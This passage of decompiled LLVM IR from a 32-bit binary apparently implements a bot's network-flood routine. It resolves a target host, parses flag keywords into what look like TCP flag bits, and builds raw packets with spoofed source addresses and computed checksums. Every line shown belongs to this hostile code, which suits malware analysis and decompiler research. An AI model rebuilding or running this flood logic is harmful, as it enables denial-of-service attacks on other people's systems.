  %v4_804be6e = add nuw nsw i32 %storemerge150, 1
  %v9_804be71 = icmp ult i32 %v4_804be6e, 19
  store i1 %v9_804be71, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_804be6e, 20
  br i1 %exitcond, label %dec_label_pc_804be77, label %dec_label_pc_804be5d

dec_label_pc_804be77:                             ; preds = %dec_label_pc_804be5d
  %v1_804be7a = add i32 %arg4, 4
  %v5_804be7a = icmp ugt i32 %arg4, -5
  %v1_804be7d = inttoptr i32 %v1_804be7a to i32*
  %v2_804be7d = load i32, i32* %v1_804be7d, align 4
  %v0_804be7f = load i32, i32* @esp, align 4
  %v5_804be7f = icmp ult i32 %v0_804be7f, 8
  store i1 %v5_804be7f, i1* %cf.global-to-local, align 1
  %v2_804be86 = call i32 @host2ip(i32 %arg2, i32 %v2_804be7d)
  %v1_804be94 = add i32 %arg4, 12
  %v1_804be97 = inttoptr i32 %v1_804be94 to i32*
  %v2_804be97 = load i32, i32* %v1_804be97, align 4
  store i1 %v5_804bde1, i1* %cf.global-to-local, align 1
  %v1_804be9d = call i32 @atol(i32 %v2_804be97)
  store i1 %v5_804be7a, i1* %cf.global-to-local, align 1
  %v2_804bebc = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_8069844.164 to i32))
  store i32 2, i32* %stack_var_-188, align 4
  store i8 69, i8* %stack_var_-120, align 1
  %v1_804bf43 = and i8 %tmp109, -64
  %v1_804bf52 = add i32 %arg4, 8
  %v5_804bf52 = icmp ugt i32 %arg4, -9
  store i1 %v5_804bf52, i1* %cf.global-to-local, align 1
  %v1_804bf55 = inttoptr i32 %v1_804bf52 to i32*
  %v2_804bf55 = load i32, i32* %v1_804bf55, align 4
  store i1 false, i1* @df, align 1
  %v4_804bf72 = inttoptr i32 %v2_804bf55 to i8*
  store i32 %v2_804bf55, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806985f.165 to i32), i32* @edi, align 4
  %v7_804bf84 = call i32 @_strncmp(i8* %v4_804bf72, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806985f.165, i32 0, i32 0), i32 4)
  %v8_804bf84 = urem i32 %v7_804bf84, 2
  %v9_804bf84 = icmp eq i32 %v8_804bf84, 0
  %v0_804bf86 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bf86 = or i1 %v0_804bf86, %v9_804bf84
  %v3_804bf86 = zext i1 %v2_804bf86 to i32
  %v4_804bf86 = load i32, i32* @edx, align 4
  %v5_804bf86 = and i32 %v4_804bf86, -256
  %v6_804bf86 = or i32 %v3_804bf86, %v5_804bf86
  %v7_804bf86 = xor i32 %v6_804bf86, 1
  store i32 %v7_804bf86, i32* %edx.global-to-local, align 4
  %v1_804bf8e = trunc i32 %v7_804bf86 to i8
  %v3_804bf8e = zext i1 %v0_804bf86 to i8
  %v15_804bf8e = icmp eq i8 %v1_804bf8e, %v3_804bf8e
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bf97 = icmp eq i1 %v15_804bf8e, false
  br i1 %v1_804bf97, label %dec_label_pc_804bfd4, label %dec_label_pc_804bf99

dec_label_pc_804bf99:                             ; preds = %dec_label_pc_804be77
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c2c9

dec_label_pc_804bfd4:                             ; preds = %dec_label_pc_804be77
  store i1 %v5_804bf52, i1* %cf.global-to-local, align 1
  %v2_804bfda = load i32, i32* %v1_804bf55, align 4
  store i1 false, i1* @df, align 1
  %v4_804bff7 = inttoptr i32 %v2_804bfda to i8*
  store i32 %v2_804bfda, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8069863.166 to i32), i32* @edi, align 4
  %v7_804c009 = call i32 @_strncmp(i8* %v4_804bff7, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8069863.166, i32 0, i32 0), i32 5)
  %v8_804c009 = urem i32 %v7_804c009, 2
  %v9_804c009 = icmp eq i32 %v8_804c009, 0
  %v0_804c00b = load i1, i1* %cf.global-to-local, align 1
  %v2_804c00b = or i1 %v0_804c00b, %v9_804c009
  %v3_804c00b = zext i1 %v2_804c00b to i32
  %v4_804c00b = load i32, i32* %edx.global-to-local, align 4
  %v5_804c00b = and i32 %v4_804c00b, -256
  %v6_804c00b = or i32 %v3_804c00b, %v5_804c00b
  %v7_804c00b = xor i32 %v6_804c00b, 1
  store i32 %v7_804c00b, i32* %edx.global-to-local, align 4
  %v1_804c013 = trunc i32 %v7_804c00b to i8
  %v3_804c013 = zext i1 %v0_804c00b to i8
  %v15_804c013 = icmp eq i8 %v1_804c013, %v3_804c013
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c01c = icmp eq i1 %v15_804c013, false
  br i1 %v1_804c01c, label %dec_label_pc_804c03e, label %dec_label_pc_804c01e

dec_label_pc_804c01e:                             ; preds = %dec_label_pc_804bfd4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c2c9

dec_label_pc_804c03e:                             ; preds = %dec_label_pc_804bfd4
  store i1 %v5_804bf52, i1* %cf.global-to-local, align 1
  %v2_804c044 = load i32, i32* %v1_804bf55, align 4
  store i1 false, i1* @df, align 1
  %v4_804c061 = inttoptr i32 %v2_804c044 to i8*
  store i32 %v2_804c044, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8069868.167 to i32), i32* @edi, align 4
  %v7_804c073 = call i32 @_strncmp(i8* %v4_804c061, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8069868.167, i32 0, i32 0), i32 5)
  %v8_804c073 = urem i32 %v7_804c073, 2
  %v9_804c073 = icmp eq i32 %v8_804c073, 0
  %v0_804c075 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c075 = or i1 %v0_804c075, %v9_804c073
  %v3_804c075 = zext i1 %v2_804c075 to i32
  %v4_804c075 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c075 = and i32 %v4_804c075, -256
  %v6_804c075 = or i32 %v3_804c075, %v5_804c075
  %v7_804c075 = xor i32 %v6_804c075, 1
  store i32 %v7_804c075, i32* @edx, align 4
  %v3_804c07b = and i32 %v7_804c073, -256
  %v1_804c07d = trunc i32 %v7_804c075 to i8
  %v3_804c07d = zext i1 %v0_804c075 to i8
  %v4_804c07d = sub nsw i8 %v1_804c07d, %v3_804c07d
  %v15_804c07d = icmp eq i8 %v4_804c07d, 0
  %v20_804c07d = zext i8 %v4_804c07d to i32
  %v23_804c07d = or i32 %v20_804c07d, %v3_804c07b
  store i32 %v23_804c07d, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c086 = icmp eq i1 %v15_804c07d, false
  br i1 %v1_804c086, label %dec_label_pc_804c09f, label %dec_label_pc_804c088

dec_label_pc_804c088:                             ; preds = %dec_label_pc_804c03e
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c2c9

dec_label_pc_804c09f:                             ; preds = %dec_label_pc_804c03e
  %v2_804c0a5 = load i32, i32* %v1_804bf55, align 4
  store i32 %v2_804c0a5, i32* @eax, align 4
  %v0_804c0a7 = load i32, i32* @esp, align 4
  %v5_804c0a7 = icmp ult i32 %v0_804c0a7, 8
  store i1 %v5_804c0a7, i1* %cf.global-to-local, align 1
  %v2_804c0b0 = call i32 @__GI_strtok(i32 %v2_804c0a5, i32 ptrtoint (i32* @global_var_806986d.168 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804c2bf44 = icmp eq i32 %v2_804c0b0, 0
  %v1_804c2c351 = icmp eq i1 %v5_804c2bf44, false
  br i1 %v1_804c2c351, label %dec_label_pc_804c0c0, label %dec_label_pc_804c2c9

dec_label_pc_804c0c0:                             ; preds = %dec_label_pc_804c09f, %dec_label_pc_804c2aa
  %v3_804c25c.in = phi i32 [ %v2_804c2b4, %dec_label_pc_804c2aa ], [ %v2_804c0b0, %dec_label_pc_804c09f ]
  %stack_var_-87.152 = phi i8 [ %stack_var_-87.0, %dec_label_pc_804c2aa ], [ %v1_804bf43, %dec_label_pc_804c09f ]
  %v3_804c25c = inttoptr i32 %v3_804c25c.in to i8*
  store i1 false, i1* @df, align 1
  store i32 %v3_804c25c.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806986f.169 to i32), i32* @edi, align 4
  %v7_804c0f0 = call i32 @_strncmp(i8* %v3_804c25c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806986f.169, i32 0, i32 0), i32 4)
  %v8_804c0f0 = urem i32 %v7_804c0f0, 2
  %v9_804c0f0 = icmp eq i32 %v8_804c0f0, 0
  %v0_804c0f2 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c0f2 = or i1 %v0_804c0f2, %v9_804c0f0
  %v3_804c0f2 = zext i1 %v2_804c0f2 to i32
  %v4_804c0f2 = load i32, i32* @edx, align 4
  %v5_804c0f2 = and i32 %v4_804c0f2, -256
  %v6_804c0f2 = or i32 %v3_804c0f2, %v5_804c0f2
  %v7_804c0f2 = xor i32 %v6_804c0f2, 1
  store i32 %v7_804c0f2, i32* @edx, align 4
  %v3_804c0f8 = and i32 %v7_804c0f0, -256
  %v1_804c0fa = trunc i32 %v7_804c0f2 to i8
  %v3_804c0fa = zext i1 %v0_804c0f2 to i8
  %v4_804c0fa = sub nsw i8 %v1_804c0fa, %v3_804c0fa
  %v15_804c0fa = icmp eq i8 %v4_804c0fa, 0
  %v20_804c0fa = zext i8 %v4_804c0fa to i32
  %v23_804c0fa = or i32 %v20_804c0fa, %v3_804c0f8
  store i32 %v23_804c0fa, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c103 = icmp eq i1 %v15_804c0fa, false
  br i1 %v1_804c103, label %dec_label_pc_804c113, label %dec_label_pc_804c105

dec_label_pc_804c105:                             ; preds = %dec_label_pc_804c0c0
  %v2_804c0fe = sext i8 %v4_804c0fa to i32
  %v4_804c105 = zext i8 %stack_var_-87.152 to i32
  %v6_804c105 = and i32 %v2_804c0fe, -256
  %v7_804c105 = or i32 %v4_804c105, %v6_804c105
  %v1_804c108 = or i32 %v7_804c105, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804c108 = trunc i32 %v1_804c108 to i8
  store i32 %v1_804c108, i32* @eax, align 4
  br label %dec_label_pc_804c2aa

dec_label_pc_804c113:                             ; preds = %dec_label_pc_804c0c0
  store i1 false, i1* @df, align 1
  store i32 %v3_804c25c.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069873.170 to i32), i32* @edi, align 4
  %v7_804c143 = call i32 @_strncmp(i8* %v3_804c25c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069873.170, i32 0, i32 0), i32 4)
  %v8_804c143 = urem i32 %v7_804c143, 2
  %v9_804c143 = icmp eq i32 %v8_804c143, 0
  %v0_804c145 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c145 = or i1 %v0_804c145, %v9_804c143
  %v3_804c145 = zext i1 %v2_804c145 to i32
  %v4_804c145 = load i32, i32* @edx, align 4
  %v5_804c145 = and i32 %v4_804c145, -256
  %v6_804c145 = or i32 %v3_804c145, %v5_804c145
  %v7_804c145 = xor i32 %v6_804c145, 1
  store i32 %v7_804c145, i32* @edx, align 4
  %v3_804c14b = and i32 %v7_804c143, -256
  %v1_804c14d = trunc i32 %v7_804c145 to i8
  %v3_804c14d = zext i1 %v0_804c145 to i8
  %v4_804c14d = sub nsw i8 %v1_804c14d, %v3_804c14d
  %v15_804c14d = icmp eq i8 %v4_804c14d, 0
  %v20_804c14d = zext i8 %v4_804c14d to i32
  %v23_804c14d = or i32 %v20_804c14d, %v3_804c14b
  store i32 %v23_804c14d, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c156 = icmp eq i1 %v15_804c14d, false
  br i1 %v1_804c156, label %dec_label_pc_804c166, label %dec_label_pc_804c158

dec_label_pc_804c158:                             ; preds = %dec_label_pc_804c113
  %v2_804c151 = sext i8 %v4_804c14d to i32
  %v4_804c158 = zext i8 %stack_var_-87.152 to i32
  %v6_804c158 = and i32 %v2_804c151, -256
  %v7_804c158 = or i32 %v4_804c158, %v6_804c158
  %v1_804c15b = or i32 %v7_804c158, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804c15b = trunc i32 %v1_804c15b to i8
  store i32 %v1_804c15b, i32* @eax, align 4
  br label %dec_label_pc_804c2aa

dec_label_pc_804c166:                             ; preds = %dec_label_pc_804c113
  store i1 false, i1* @df, align 1
  store i32 %v3_804c25c.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069877.171 to i32), i32* @edi, align 4
  %v7_804c196 = call i32 @_strncmp(i8* %v3_804c25c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069877.171, i32 0, i32 0), i32 4)
  %v8_804c196 = urem i32 %v7_804c196, 2
  %v9_804c196 = icmp eq i32 %v8_804c196, 0
  %v0_804c198 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c198 = or i1 %v0_804c198, %v9_804c196
  %v3_804c198 = zext i1 %v2_804c198 to i32
  %v4_804c198 = load i32, i32* @edx, align 4
  %v5_804c198 = and i32 %v4_804c198, -256
  %v6_804c198 = or i32 %v3_804c198, %v5_804c198
  %v7_804c198 = xor i32 %v6_804c198, 1
  store i32 %v7_804c198, i32* @edx, align 4
  %v3_804c19e = and i32 %v7_804c196, -256
  %v1_804c1a0 = trunc i32 %v7_804c198 to i8
  %v3_804c1a0 = zext i1 %v0_804c198 to i8
  %v4_804c1a0 = sub nsw i8 %v1_804c1a0, %v3_804c1a0
  %v15_804c1a0 = icmp eq i8 %v4_804c1a0, 0
  %v20_804c1a0 = zext i8 %v4_804c1a0 to i32
  %v23_804c1a0 = or i32 %v20_804c1a0, %v3_804c19e
  store i32 %v23_804c1a0, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c1a9 = icmp eq i1 %v15_804c1a0, false
  br i1 %v1_804c1a9, label %dec_label_pc_804c1b9, label %dec_label_pc_804c1ab

dec_label_pc_804c1ab:                             ; preds = %dec_label_pc_804c166
  %v2_804c1a4 = sext i8 %v4_804c1a0 to i32
  %v4_804c1ab = zext i8 %stack_var_-87.152 to i32
  %v6_804c1ab = and i32 %v2_804c1a4, -256
  %v7_804c1ab = or i32 %v4_804c1ab, %v6_804c1ab
  %v1_804c1ae = or i32 %v7_804c1ab, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804c1ae = trunc i32 %v1_804c1ae to i8
  store i32 %v1_804c1ae, i32* @eax, align 4
  br label %dec_label_pc_804c2aa

dec_label_pc_804c1b9:                             ; preds = %dec_label_pc_804c166
  store i1 false, i1* @df, align 1
  store i32 %v3_804c25c.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806987b.172 to i32), i32* @edi, align 4
  %v7_804c1e9 = call i32 @_strncmp(i8* %v3_804c25c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806987b.172, i32 0, i32 0), i32 4)
  %v8_804c1e9 = urem i32 %v7_804c1e9, 2
  %v9_804c1e9 = icmp eq i32 %v8_804c1e9, 0
  %v0_804c1eb = load i1, i1* %cf.global-to-local, align 1
  %v2_804c1eb = or i1 %v0_804c1eb, %v9_804c1e9
  %v3_804c1eb = zext i1 %v2_804c1eb to i32
  %v4_804c1eb = load i32, i32* @edx, align 4
  %v5_804c1eb = and i32 %v4_804c1eb, -256
  %v6_804c1eb = or i32 %v3_804c1eb, %v5_804c1eb
  %v7_804c1eb = xor i32 %v6_804c1eb, 1
  store i32 %v7_804c1eb, i32* @edx, align 4
  %v3_804c1f1 = and i32 %v7_804c1e9, -256
  %v1_804c1f3 = trunc i32 %v7_804c1eb to i8
  %v3_804c1f3 = zext i1 %v0_804c1eb to i8
  %v4_804c1f3 = sub nsw i8 %v1_804c1f3, %v3_804c1f3
  %v15_804c1f3 = icmp eq i8 %v4_804c1f3, 0
  %v20_804c1f3 = zext i8 %v4_804c1f3 to i32
  %v23_804c1f3 = or i32 %v20_804c1f3, %v3_804c1f1
  store i32 %v23_804c1f3, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c1fc = icmp eq i1 %v15_804c1f3, false
  br i1 %v1_804c1fc, label %dec_label_pc_804c20c, label %dec_label_pc_804c1fe

dec_label_pc_804c1fe:                             ; preds = %dec_label_pc_804c1b9
  %v2_804c1f7 = sext i8 %v4_804c1f3 to i32
  %v4_804c1fe = zext i8 %stack_var_-87.152 to i32
  %v6_804c1fe = and i32 %v2_804c1f7, -256
  %v7_804c1fe = or i32 %v4_804c1fe, %v6_804c1fe
  %v1_804c201 = or i32 %v7_804c1fe, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804c201 = trunc i32 %v1_804c201 to i8
  store i32 %v1_804c201, i32* @eax, align 4
  br label %dec_label_pc_804c2aa

dec_label_pc_804c20c:                             ; preds = %dec_label_pc_804c1b9
  store i1 false, i1* @df, align 1
  store i32 %v3_804c25c.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806987f.173 to i32), i32* @edi, align 4
  %v7_804c23c = call i32 @_strncmp(i8* %v3_804c25c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806987f.173, i32 0, i32 0), i32 4)
  %v8_804c23c = urem i32 %v7_804c23c, 2
  %v9_804c23c = icmp eq i32 %v8_804c23c, 0
  %v0_804c23e = load i1, i1* %cf.global-to-local, align 1
  %v2_804c23e = or i1 %v0_804c23e, %v9_804c23c
  %v3_804c23e = zext i1 %v2_804c23e to i32
  %v4_804c23e = load i32, i32* @edx, align 4
  %v5_804c23e = and i32 %v4_804c23e, -256
  %v6_804c23e = or i32 %v3_804c23e, %v5_804c23e
  %v7_804c23e = xor i32 %v6_804c23e, 1
  store i32 %v7_804c23e, i32* @edx, align 4
  %v3_804c244 = and i32 %v7_804c23c, -256
  %v1_804c246 = trunc i32 %v7_804c23e to i8
  %v3_804c246 = zext i1 %v0_804c23e to i8
  %v4_804c246 = sub nsw i8 %v1_804c246, %v3_804c246
  %v15_804c246 = icmp eq i8 %v4_804c246, 0
  %v20_804c246 = zext i8 %v4_804c246 to i32
  %v23_804c246 = or i32 %v20_804c246, %v3_804c244
  store i32 %v23_804c246, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c24f = icmp eq i1 %v15_804c246, false
  br i1 %v1_804c24f, label %dec_label_pc_804c25c, label %dec_label_pc_804c251

dec_label_pc_804c251:                             ; preds = %dec_label_pc_804c20c
  %v2_804c24a = sext i8 %v4_804c246 to i32
  %v4_804c251 = zext i8 %stack_var_-87.152 to i32
  %v6_804c251 = and i32 %v2_804c24a, -256
  %v7_804c251 = or i32 %v4_804c251, %v6_804c251
  %v1_804c254 = or i32 %v7_804c251, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804c254 = trunc i32 %v1_804c254 to i8
  store i32 %v1_804c254, i32* @eax, align 4
  br label %dec_label_pc_804c2aa

dec_label_pc_804c25c:                             ; preds = %dec_label_pc_804c20c
  store i1 false, i1* @df, align 1
  store i32 %v3_804c25c.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069883.174 to i32), i32* @edi, align 4
  %v7_804c28c = call i32 @_strncmp(i8* %v3_804c25c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069883.174, i32 0, i32 0), i32 4)
  %v8_804c28c = urem i32 %v7_804c28c, 2
  %v9_804c28c = icmp eq i32 %v8_804c28c, 0
  %v0_804c28e = load i1, i1* %cf.global-to-local, align 1
  %v2_804c28e = or i1 %v0_804c28e, %v9_804c28c
  %v3_804c28e = zext i1 %v2_804c28e to i32
  %v4_804c28e = load i32, i32* @edx, align 4
  %v5_804c28e = and i32 %v4_804c28e, -256
  %v6_804c28e = or i32 %v3_804c28e, %v5_804c28e
  %v7_804c28e = xor i32 %v6_804c28e, 1
  store i32 %v7_804c28e, i32* @edx, align 4
  %v3_804c294 = and i32 %v7_804c28c, -256
  %v1_804c296 = trunc i32 %v7_804c28e to i8
  %v3_804c296 = zext i1 %v0_804c28e to i8
  %v4_804c296 = sub nsw i8 %v1_804c296, %v3_804c296
  %v15_804c296 = icmp eq i8 %v4_804c296, 0
  %v20_804c296 = zext i8 %v4_804c296 to i32
  %v23_804c296 = or i32 %v20_804c296, %v3_804c294
  store i32 %v23_804c296, i32* @ecx, align 4
  %v2_804c29a = sext i8 %v4_804c296 to i32
  store i32 %v2_804c29a, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c29f = icmp eq i1 %v15_804c296, false
  br i1 %v1_804c29f, label %dec_label_pc_804c2aa, label %dec_label_pc_804c2a1

dec_label_pc_804c2a1:                             ; preds = %dec_label_pc_804c25c
  %v4_804c2a1 = zext i8 %stack_var_-87.152 to i32
  %v6_804c2a1 = and i32 %v2_804c29a, -256
  %v7_804c2a1 = or i32 %v4_804c2a1, %v6_804c2a1
  %v1_804c2a4 = or i32 %v7_804c2a1, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804c2a4 = trunc i32 %v1_804c2a4 to i8
  store i32 %v1_804c2a4, i32* @eax, align 4
  br label %dec_label_pc_804c2aa

dec_label_pc_804c2aa:                             ; preds = %dec_label_pc_804c25c, %dec_label_pc_804c251, %dec_label_pc_804c1fe, %dec_label_pc_804c1ab, %dec_label_pc_804c158, %dec_label_pc_804c105, %dec_label_pc_804c2a1
  %stack_var_-87.0 = phi i8 [ %stack_var_-87.152, %dec_label_pc_804c25c ], [ %v3_804c2a4, %dec_label_pc_804c2a1 ], [ %v3_804c254, %dec_label_pc_804c251 ], [ %v3_804c201, %dec_label_pc_804c1fe ], [ %v3_804c1ae, %dec_label_pc_804c1ab ], [ %v3_804c15b, %dec_label_pc_804c158 ], [ %v3_804c108, %dec_label_pc_804c105 ]
  %v0_804c2aa = load i32, i32* @esp, align 4
  %v5_804c2aa = icmp ult i32 %v0_804c2aa, 8
  store i1 %v5_804c2aa, i1* %cf.global-to-local, align 1
  %v2_804c2b4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_806986d.168 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804c2bf = icmp eq i32 %v2_804c2b4, 0
  %v1_804c2c3 = icmp eq i1 %v5_804c2bf, false
  br i1 %v1_804c2c3, label %dec_label_pc_804c0c0, label %dec_label_pc_804c2c9

dec_label_pc_804c2c9:                             ; preds = %dec_label_pc_804c2aa, %dec_label_pc_804c09f, %dec_label_pc_804c088, %dec_label_pc_804c01e, %dec_label_pc_804bf99
  %v2_804c375 = ptrtoint i8* %stack_var_-120 to i32
  %v2_804c3f3 = ptrtoint i16* %stack_var_-172 to i32
  %v2_804c3f9 = ptrtoint i32* %stack_var_-160 to i32
  %v15_804c3ff = ptrtoint i16* %stack_var_-100 to i32
  %v12_804c41d = ptrtoint i32* %stack_var_-140 to i32
  %v5_804c424 = icmp ugt i8* %stack_var_-120, inttoptr (i32 -41 to i8*)
  %v15_804c424 = ptrtoint i32* %stack_var_-80 to i32
  %v2_804c44a = ptrtoint i32* %stack_var_-188 to i32
  %v5_804c486 = add i32 %v1_804be9d, %v2_804bde6
  br label %dec_label_pc_804c2fa

dec_label_pc_804c2fa:                             ; preds = %dec_label_pc_804c49e, %dec_label_pc_804c2c9
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_804c2c9 ], [ %v4_804c49e, %dec_label_pc_804c49e ]
  %v0_804c2fa = load i32, i32* @esp, align 4
  %v5_804c2fa = icmp ult i32 %v0_804c2fa, 8
  store i1 %v5_804c2fa, i1* %cf.global-to-local, align 1
  %v5_804c2fd = add i32 %v0_804c2fa, -12
  %v6_804c2fd = inttoptr i32 %v5_804c2fd to i32*
  store i32 31, i32* %v6_804c2fd, align 4
  %v1_804c300 = add i32 %v0_804c2fa, -16
  %v2_804c300 = inttoptr i32 %v1_804c300 to i32*
  store i32 0, i32* %v2_804c300, align 4
  %v1_804c302 = load i32, i32* %stack_var_-160, align 4
  %v3_804c302 = call i32 @realrand(i32 0, i32 %v1_804c302)
  %v0_804c307 = load i32, i32* @esp, align 4
  %v2_804c307 = icmp ugt i32 %v0_804c307, -17
  store i1 %v2_804c307, i1* %cf.global-to-local, align 1
  %v0_804c30a = load i32, i32* @ebp, align 4
  %v2_804c30a = mul i32 %v3_804c302, 4
  %v3_804c30a = add i32 %v2_804c30a, -392
  %v4_804c30a = add i32 %v3_804c30a, %v0_804c30a
  %v5_804c30a = inttoptr i32 %v4_804c30a to i32*
  %v6_804c30a = load i32, i32* %v5_804c30a, align 4
  %sext27 = mul i32 %v6_804c30a, 65536
  %v1_804c314 = sdiv i32 %sext27, 65536
  %v2_804c314 = call i32 @getspoof(i32 %v1_804c314)
  %v3_804c314 = trunc i32 %v2_804c314 to i16
  %v0_804c327 = load i32, i32* @esp, align 4
  %v5_804c327 = icmp ult i32 %v0_804c327, 12
  store i1 %v5_804c327, i1* %cf.global-to-local, align 1
  %v2_804c32a = add i32 %v0_804c327, -16
  %v3_804c32a = inttoptr i32 %v2_804c32a to i32*
  store i32 60, i32* %v3_804c32a, align 4
  %sext30 = mul i32 %v2_804c314, 65536
  %v1_804c32b = sdiv i32 %sext30, 65536
  %v2_804c32b = call i32 @htons(i32 %v1_804c32b)
  %v0_804c330 = load i32, i32* @esp, align 4
  %v2_804c330 = icmp ugt i32 %v0_804c330, -17
  store i1 %v2_804c330, i1* %cf.global-to-local, align 1
  %v1_804c337 = call i32 @random()
  store i16 %v3_804c314, i16* %stack_var_-100, align 2
  %v1_804c35a = call i32 @random()
  %v0_804c378 = load i32, i32* @esp, align 4
  %v1_804c378 = add i32 %v0_804c378, -4
  %v2_804c378 = inttoptr i32 %v1_804c378 to i32*
  store i32 20, i32* %v2_804c378, align 4
  %v2_804c37a = add i32 %v0_804c378, -8
  %v3_804c37a = inttoptr i32 %v2_804c37a to i32*
  store i32 %v2_804c375, i32* %v3_804c37a, align 4
  %v3_804c37b = inttoptr i32 %v1_804c314 to i16*
  %v4_804c37b = call i32 @in_cksum(i16* %v3_804c37b, i32 %v2_804be86)
  %v0_804c380 = load i32, i32* @esp, align 4
  %v5_804c380 = icmp ugt i32 %v0_804c380, -9
  store i1 %v5_804c380, i1* %cf.global-to-local, align 1
  %v1_804c387 = call i32 @random()
  store i16 %v3_804c314, i16* %stack_var_-172, align 2
  %v0_804c3e0 = load i32, i32* @esp, align 4
  %v5_804c3e0 = icmp ult i32 %v0_804c3e0, 12
  store i1 %v5_804c3e0, i1* %cf.global-to-local, align 1
  %v2_804c3e3 = add i32 %v0_804c3e0, -16
  %v3_804c3e3 = inttoptr i32 %v2_804c3e3 to i32*
  store i32 40, i32* %v3_804c3e3, align 4
  %sext59 = mul i32 %v1_804c387, 16777216
  %v1_804c3e4 = sdiv i32 %sext59, 16777216
  %v2_804c3e4 = call i32 @htons(i32 %v1_804c3e4)
  %v0_804c3e9 = load i32, i32* @esp, align 4
  store i32 %v2_804c3f9, i32* %edx.global-to-local, align 4
  %tmp = and i32 %v0_804c3e9, -4
  %v5_804c402 = icmp eq i32 %tmp, -16
  store i1 %v5_804c402, i1* %cf.global-to-local, align 1
  %v1_804c405 = add i32 %v0_804c3e9, 8
  %v2_804c405 = inttoptr i32 %v1_804c405 to i32*
  store i32 20, i32* %v2_804c405, align 4
  %v2_804c407 = add i32 %v0_804c3e9, 4
  %v3_804c407 = inttoptr i32 %v2_804c407 to i32*
  store i32 %v2_804c3f9, i32* %v3_804c407, align 4
  %v3_804c408 = inttoptr i32 %v0_804c3e9 to i32*
  store i32 %v15_804c3ff, i32* %v3_804c408, align 4
  %sext36 = mul i32 %v2_804c3e4, 65536
  %v1_804c409 = sdiv i32 %sext36, 65536
  %v4_804c409 = call i32 @bcopy(i32 %v1_804c409, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804c40e = load i32, i32* @esp, align 4
  %v5_804c414 = add i32 %v0_804c40e, 8
  %v6_804c414 = inttoptr i32 %v5_804c414 to i32*
  store i32 20, i32* %v6_804c414, align 4
  %v2_804c420 = add i32 %v0_804c40e, 4
  %v3_804c420 = inttoptr i32 %v2_804c420 to i32*
  store i32 %v12_804c41d, i32* %v3_804c420, align 4
  store i1 %v5_804c424, i1* %cf.global-to-local, align 1
  %v3_804c427 = inttoptr i32 %v0_804c40e to i32*
  store i32 %v15_804c424, i32* %v3_804c427, align 4
  %v4_804c428 = call i32 @bcopy(i32 %v1_804c409, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804c42d = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804c3f3, i32* %edx.global-to-local, align 4
  %v2_804c43c = add i32 %v0_804c42d, 12
  %v3_804c43c = inttoptr i32 %v2_804c43c to i32*
  store i32 52, i32* %v3_804c43c, align 4
  %v2_804c43d = add i32 %v0_804c42d, 8
  %v3_804c43d = inttoptr i32 %v2_804c43d to i32*
  store i32 %v2_804c3f3, i32* %v3_804c43d, align 4
  %v3_804c43e = inttoptr i32 %v1_804c409 to i16*
  %v4_804c43e = call i32 @in_cksum(i16* %v3_804c43e, i32 ptrtoint (i32* @0 to i32))
  %v0_804c443 = load i32, i32* @esp, align 4
  store i32 60, i32* %edx.global-to-local, align 4
  %v5_804c456 = icmp ugt i32 %v0_804c443, -9
  store i1 %v5_804c456, i1* %cf.global-to-local, align 1
  %v1_804c459 = add i32 %v0_804c443, -4
